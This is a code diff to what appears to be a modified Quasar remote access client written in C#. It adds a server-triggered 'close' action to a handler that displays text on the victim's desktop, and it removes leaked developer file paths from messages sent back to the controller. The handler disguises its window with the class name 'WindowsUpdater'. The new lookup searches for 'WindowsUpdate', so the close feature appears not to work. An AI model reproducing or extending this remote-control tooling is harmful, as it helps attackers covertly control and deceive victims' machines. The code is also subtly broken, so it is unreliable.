@@ -6,6 +6,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -13,6 +14,19 @@ namespace Quasar.Client.Messages
 {
     public class RedTextHandler : IMessageProcessor
     {
+
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern int GetClassName(IntPtr hwnd, StringBuilder lpClassName, int nMaxCount);
+
         public bool CanExecute(IMessage message) => message is DoShowRedText;
 
         public bool CanExecuteFrom(ISender sender) => true;
@@ -38,11 +52,41 @@ namespace Quasar.Client.Messages
                 bool flag7 = false;
                 string contentStr = ""; //display text
                 contentStr = message.Text;
+                string str = "WindowsUpdater"; // window class name
+
                 string text9 = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".txt");
                 if (actionStr == "close")
                 {
                     contentStr = "";
                     flag7 = true;
+
+                    IntPtr hwnd = FindWindow("WindowsUpdate", null);  // Find the window by class name
+
+                    if (hwnd != IntPtr.Zero)
+                    {
+                        // Get the process ID associated with the window
+                        uint processId;
+                        GetWindowThreadProcessId(hwnd, out processId);
+
+                        // Get the process object
+                        Process process = Process.GetProcessById((int)processId);
+
+                        // Kill the process
+                        if (process != null)
+                        {
+                            // Console.WriteLine($"Terminating process: {process.ProcessName} (PID: {processId})");
+                            process.Kill();
+                            client.Send(new NotifyMessageToServer { Message = "Closed Red Text Window" });
+                            return;
+                            // Console.WriteLine("Process terminated.");
+                        }
+                    }
+                    else
+                    {
+                        // Console.WriteLine("Window not found.");
+                        client.Send(new NotifyMessageToServer { Message = "There is no Red Text Window" });
+                        return;
+                    }
                 }
                 try
                 {
@@ -53,7 +97,6 @@ namespace Quasar.Client.Messages
                 {
                     client.Send(new NotifyMessageToServer { Message = "Invisible text writing error!" });
                 }
-                string str = "WindowsUpdater"; // window class name
                 if (message.WindowClassName != null)
                 {
                     // str = message.WindowClassName;
@@ -99,12 +142,12 @@ namespace Quasar.Client.Messages
                         Process.Start(text10, text9);
                         if (!flag7)
                         {
-                            client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("D:\\Projects\\Quasar-AllInOne\\Quasar-Modified\\Client\\Core\\Commands\\MiscHandler.cs"), Misc.__LINE__(437), "Invisible text showed (on Default desktop)!") });
+                            client.Send(new NotifyMessageToServer { Message = string.Format("{0}","Invisible text showed (on Default desktop)!") });
                         }
                     }
                     else if (!flag7)
                     {
-                        client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("D:\\Projects\\Quasar-AllInOne\\Quasar-Modified\\Client\\Core\\Commands\\MiscHandler.cs"), Misc.__LINE__(442), string.Format("Invisible text showed (on {0} desktop)!", "Desktop")) });
+                        client.Send(new NotifyMessageToServer { Message = string.Format("{0}", string.Format("Invisible text showed (on {0} desktop)!", "Desktop")) });
                     }
                     return;
                 }
@@ -112,7 +155,7 @@ namespace Quasar.Client.Messages
                 {
                     if (!flag7)
                     {
-                        client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("D:\\Projects\\Quasar-AllInOne\\Quasar-Modified\\Client\\Core\\Commands\\MiscHandler.cs"), Misc.__LINE__(448), ex16.Message) });
+                        client.Send(new NotifyMessageToServer { Message = string.Format("{0}", ex16.Message) });
                     }
                     return;
                 }
